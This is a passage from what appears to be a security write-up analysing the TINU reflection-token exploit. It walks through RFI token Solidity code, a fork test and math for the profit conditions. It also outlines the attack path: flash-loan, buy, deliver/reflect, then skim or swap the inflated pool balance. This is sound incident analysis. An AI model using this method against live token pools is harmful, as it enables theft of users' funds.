</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">    </span><span class="kt">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span><span class="w"> </span>i<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span>_excluded<span class="p">.</span>length<span class="p">;</span><span class="w"> </span>i<span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>_excluded<span class="p">[</span>i<span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>account<span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">                </span>_excluded<span class="p">[</span>i<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_excluded<span class="p">[</span>_excluded<span class="p">.</span>length<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">];</span>
</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w">                </span>_tOwned<span class="p">[</span>account<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w">                </span>_isExcluded<span class="p">[</span>account<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span>
</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w">                </span>_excluded<span class="p">.</span>pop<span class="p">();</span>
</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="w">                </span><span class="kt">break</span><span class="p">;</span>
</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="p">}</span>
</span></code></pre></div>
<p>For certain addresses, the owner can choose to exclude them from the entire reflection mechanism by calling the <code>excludeAccount</code> function. The balance of excluded addresses will no longer be calculated using <code>tokenFromReflection(rOwned)</code> but will directly use the value of <code>tOwned</code>, ensuring that their balance remains unchanged after reflection.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_transferToExcluded</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">recipient</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rFee</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_getValues<span class="p">(</span>tAmount<span class="p">);</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span>_rOwned<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rOwned<span class="p">[</span>sender<span class="p">].</span>sub<span class="p">(</span>rAmount<span class="p">);</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">    </span>_tOwned<span class="p">[</span>recipient<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_tOwned<span class="p">[</span>recipient<span class="p">].</span>add<span class="p">(</span>tTransferAmount<span class="p">);</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">    </span>_rOwned<span class="p">[</span>recipient<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rOwned<span class="p">[</span>recipient<span class="p">].</span>add<span class="p">(</span>rTransferAmount<span class="p">);</span><span class="w">       </span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">    </span>_reflectFee<span class="p">(</span>rFee<span class="p">,</span><span class="w"> </span>tFee<span class="p">);</span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">    </span>emit<span class="w"> </span>Transfer<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>recipient<span class="p">,</span><span class="w"> </span>tTransferAmount<span class="p">);</span>
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="p">}</span>
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_transferFromExcluded</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">recipient</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rFee</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_getValues<span class="p">(</span>tAmount<span class="p">);</span>
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="w">    </span>_tOwned<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_tOwned<span class="p">[</span>sender<span class="p">].</span>sub<span class="p">(</span>tAmount<span class="p">);</span>
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="w">    </span>_rOwned<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rOwned<span class="p">[</span>sender<span class="p">].</span>sub<span class="p">(</span>rAmount<span class="p">);</span>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="w">    </span>_rOwned<span class="p">[</span>recipient<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rOwned<span class="p">[</span>recipient<span class="p">].</span>add<span class="p">(</span>rTransferAmount<span class="p">);</span><span class="w"> </span>
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="w">    </span>_reflectFee<span class="p">(</span>rFee<span class="p">,</span><span class="w"> </span>tFee<span class="p">);</span>
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="w">    </span>emit<span class="w"> </span>Transfer<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>recipient<span class="p">,</span><span class="w"> </span>tTransferAmount<span class="p">);</span>
</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="p">}</span>
</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>
</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_transferBothExcluded</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">recipient</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rFee</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_getValues<span class="p">(</span>tAmount<span class="p">);</span>
</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="w">    </span>_tOwned<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_tOwned<span class="p">[</span>sender<span class="p">].</span>sub<span class="p">(</span>tAmount<span class="p">);</span>
</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a><span class="w">    </span>_rOwned<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rOwned<span class="p">[</span>sender<span class="p">].</span>sub<span class="p">(</span>rAmount<span class="p">);</span>
</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a><span class="w">    </span>_tOwned<span class="p">[</span>recipient<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_tOwned<span class="p">[</span>recipient<span class="p">].</span>add<span class="p">(</span>tTransferAmount<span class="p">);</span>
</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a><span class="w">    </span>_rOwned<span class="p">[</span>recipient<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rOwned<span class="p">[</span>recipient<span class="p">].</span>add<span class="p">(</span>rTransferAmount<span class="p">);</span><span class="w">    </span>
</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a><span class="w">    </span>_reflectFee<span class="p">(</span>rFee<span class="p">,</span><span class="w"> </span>tFee<span class="p">);</span>
</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a><span class="w">    </span>emit<span class="w"> </span>Transfer<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>recipient<span class="p">,</span><span class="w"> </span>tTransferAmount<span class="p">);</span>
</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a><span class="p">}</span>
</span></code></pre></div>
<p>Similarly, during transfers, for excluded accounts, both <code>rOwned</code> and <code>tOwned</code> need to be changed accordingly.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_getCurrentSupply</span><span class="p">()</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="p">(</span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rTotal<span class="p">;</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_tTotal<span class="p">;</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">    </span><span class="kt">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span><span class="w"> </span>i<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span>_excluded<span class="p">.</span>length<span class="p">;</span><span class="w"> </span>i<span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>_rOwned<span class="p">[</span>_excluded<span class="p">[</span>i<span class="p">]]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>rSupply<span class="w"> </span><span class="o">||</span><span class="w"> </span>_tOwned<span class="p">[</span>_excluded<span class="p">[</span>i<span class="p">]]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>tSupply<span class="p">)</span><span class="w"> </span><span class="kt">return</span><span class="w"> </span><span class="p">(</span>_rTotal<span class="p">,</span><span class="w"> </span>_tTotal<span class="p">);</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="w">        </span>rSupply<span class="w"> </span><span class="o">=</span><span class="w"> </span>rSupply<span class="p">.</span>sub<span class="p">(</span>_rOwned<span class="p">[</span>_excluded<span class="p">[</span>i<span class="p">]]);</span>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="w">        </span>tSupply<span class="w"> </span><span class="o">=</span><span class="w"> </span>tSupply<span class="p">.</span>sub<span class="p">(</span>_tOwned<span class="p">[</span>_excluded<span class="p">[</span>i<span class="p">]]);</span>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>rSupply<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span>_rTotal<span class="p">.</span>div<span class="p">(</span>_tTotal<span class="p">))</span><span class="w"> </span><span class="kt">return</span><span class="w"> </span><span class="p">(</span>_rTotal<span class="p">,</span><span class="w"> </span>_tTotal<span class="p">);</span>
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="p">(</span>rSupply<span class="p">,</span><span class="w"> </span>tSupply<span class="p">);</span>
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="p">}</span>
</span></code></pre></div>
<p>When calculating the rate, excluded addresses need to be subtracted to obtain <code>rSupply</code> and <code>tSupply</code>.</p>
<hr />
<p>To summarize briefly, the balance of reflection tokens is closely related to the internal storage <code>rOwned</code>, which can be understood as shares. Transfers also involve the transfer of shares. <code>balanceOf</code> will retrieve the account's <code>rOwned</code> (shares), and then obtain the rate based on <code>rSupply/tSupply</code>, that is, how many shares correspond to one token, thus obtaining the token quantity (balance) corresponding to the account through <code>rOwned/rate</code>.</p>
<p>When a reflect(burn) occurs, the total shares decrease, while the shares <code>rOwned</code> of other users remain unchanged, so the corresponding balance quantity will increase.</p>
<p>Here is an explanation of some variables.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>tTotal: const -&gt; totalSupply
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>rTotal: variable
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>init: rTotal = q*tTotal
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>decrease in `_reflectFee` and `reflect`
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>tFeeTotal:
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>init: 0
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>increase in `_reflectFee` and `reflect`
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>balance: 
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>if excluded -&gt; tOwned
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>else -&gt; rOwend/rate
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>rate:
</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>rate = rSupply/tSupply
</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>rSupply = rTotal - rExcluded
</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>tSupply = tTotal - tExcluded
</span></code></pre></div>
<hr />
<p>Clearly, if there are no excluded addresses, after user A performs a <code>transfer</code> or <code>reflect</code>, the balances of the remaining holders will increase. For reflection token pairs, the balance in the pool will also increase, exceeding the <code>reserve</code>, allowing other users to directly profit from <code>skim</code> or <code>swap</code>.</p>
<p><img alt="" src="../../image/230126_TINU.assets/1734.png" /></p>
<p>To avoid this vulnerability, reflection tokens should at least exclude the pair address. The <a href="https://etherscan.io/address/0xbc7f0cbf65746672d9db16a23c6eb4ff77981bd4">deployer of RFI</a> excluded the <a href="https://etherscan.io/address/0x4c8341379e95f70c08defb76c4f9c036525edc30">pair</a> approximately twenty minutes after adding liquidity.</p>
<h3 id="tinu">TINU</h3>
<p>The RFI token mentioned earlier has not been attacked so far and is still operating well on-chain. Therefore, we can compare it with <a href="https://etherscan.io/address/0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F">TINU token</a> to check for potential vulnerabilities that might have led to its attack.</p>
<p><img alt="" src="../../image/230126_TINU.assets/5440.png" /></p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testExcludePair</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">16489408</span><span class="p">;</span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">    </span>console2<span class="p">.</span>log<span class="p">(</span><span class="s2">&quot;exclude pair?&quot;</span><span class="p">,</span><span class="w"> </span>tinu<span class="p">.</span>isExcluded<span class="p">(</span><span class="kt">address</span><span class="p">(</span>tinu_weth<span class="p">)));</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">    </span><span class="c1">// false</span>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="p">}</span>
</span></code></pre></div>
<p>Firstly, it is observed that although the TINU contract has an excluded address, the <a href="https://etherscan.io/address/0xc77aab3c6d7dab46248f3cc3033c856171878bd5">lockToken</a> contract is not the pair. Failing to exclude the pair will lead to the vulnerability mentioned earlier, where the balance of the pair will increase after <code>transfer</code> or <code>reflect</code>, allowing others to profit through <code>skim</code> or <code>swap</code>.</p>
<p>In TINU, the <code>reflect</code> function has been renamed, which appears as the <code>deliver</code> function in the previous invocation flow. Therefore, it can be inferred that the attack profit strategy involves the attacker purchasing a certain amount of TINU tokens from the pool, then calling the <code>deliver</code> function to "burn" them, causing the rate to decrease sharply, resulting in a significant increase in the TINU balance of the pair, far exceeding the <code>reserve</code>, thus allowing for the direct <code>swap</code> of a large amount of WETH.</p>
<p>The core question here is how to ensure that the WETH obtained in the end is greater than the WETH invested in purchasing TINU, i.e., what are the profit conditions. The analysis for RFI is provided below.</p>
<p>In RFI, the following equation exists:</p>
<div class="arithmatex">\[
\begin{align} 
rate = \frac{rSupply}{tSupply} \tag{1} \\
rSupply = rTotal - rExcluded \tag{2} \\
tSupply = tTotal - tExcluded \tag{3}
\end{align}
\]</div>
<p>Assuming the attacker already holds <span class="arithmatex">\(rReflect\)</span> amount of TINU tokens for reflection, before the attack:
$$
\begin{align} 
pairBalance0 = \frac{rPair0}{rate} = \frac{rPair0 \times tSupply}{rSupply} \tag{4}
\end{align}
$$</p>
<p>After actively reflecting:
$$
\begin{align}
pairBalance1 = \frac{rPair0}{rate'} = \frac{rPair0 \times tSupply}{rSupply - rReflect} \tag{5}
\end{align}
$$</p>
<p>The attacker can profit only if the amount of TINU tokens skimmed exceeds the amount "burned" during reflection, meaning it must satisfy:</p>
<div class="arithmatex">\[
\begin{align}
skimAmount &gt; reflectAmount = \frac{rReflect}{rate} = \frac{rReflect \times tSupply}{rSupply} \tag{6} \\  
skimAmount = pairBalance1 - pairBalance0\tag{7}
\end{align}
\]</div>
<p>Further, from <span class="arithmatex">\((2), (4), (5), (6), (7)\)</span>, we can deduce:</p>
<div class="arithmatex">\[
\begin{align}
rReflect &gt; rSupply - rPair0 \tag{8} \\
rRefelct &gt; rTotal - rExcluded - rPair0 \tag{9}
\end{align}
\]</div>
<p><span class="arithmatex">\((8), (9)\)</span> represent the profit conditions.</p>
<p>However, under normal circumstances, it is impossible to meet these conditions. Normally, <code>rTotal = rOwned(holder)</code>, meaning:
$$
\begin{align}
rTotal = rExcluded + rPair0 + rOthers \tag{10}
\end{align}
$$</p>
<p><span class="arithmatex">\((10)\)</span> is clearly contradictory to <span class="arithmatex">\((9)\)</span>, indicating that the attacker cannot obtain the required amount of tokens.</p>
<p>For attackers without tokens, they first need to borrow WETH through flash loans to purchase TINU tokens. In this scenario:
$$
\begin{align}
rRefelct + rPair0 = rPair \tag{11}
\end{align}
$$</p>
<p>Where <code>rPair</code> is the initial state before the attacker purchases TINU, and <code>rPair0</code> is the state after the purchase and before reflection.</p>
<p>From <span class="arithmatex">\((9), (11)\)</span>, it follows that the attack can only profit if:
$$
\begin{align}
rPair &gt; rTotal - rExcluded \tag{12} 
\end{align}
$$</p>
<p>It is evidently impossible to satisfy this condition as well. Therefore, there must be other vulnerabilities in TINU tokens compared to the original reflection tokens.</p>
<hr />
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_transferStandard</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">recipient</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rFee</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tteam</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_getValues<span class="p">(</span>tAmount<span class="p">);</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">    </span>_rOwned<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rOwned<span class="p">[</span>sender<span class="p">].</span>sub<span class="p">(</span>rAmount<span class="p">);</span>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">    </span>_rOwned<span class="p">[</span>recipient<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rOwned<span class="p">[</span>recipient<span class="p">].</span>add<span class="p">(</span>rTransferAmount<span class="p">);</span><span class="w"> </span>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">    </span>_taketeam<span class="p">(</span>tteam<span class="p">);</span><span class="w"> </span>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">    </span>_reflectFee<span class="p">(</span>rFee<span class="p">,</span><span class="w"> </span>tFee<span class="p">);</span>
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">    </span>emit<span class="w"> </span>Transfer<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>recipient<span class="p">,</span><span class="w"> </span>tTransferAmount<span class="p">);</span>
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="p">}</span>
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_taketeam</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tteam</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">currentRate</span><span class="w"> </span><span class="o">=</span><span class="w">  </span>_getRate<span class="p">();</span>
</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rteam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tteam<span class="p">.</span>mul<span class="p">(</span>currentRate<span class="p">);</span>
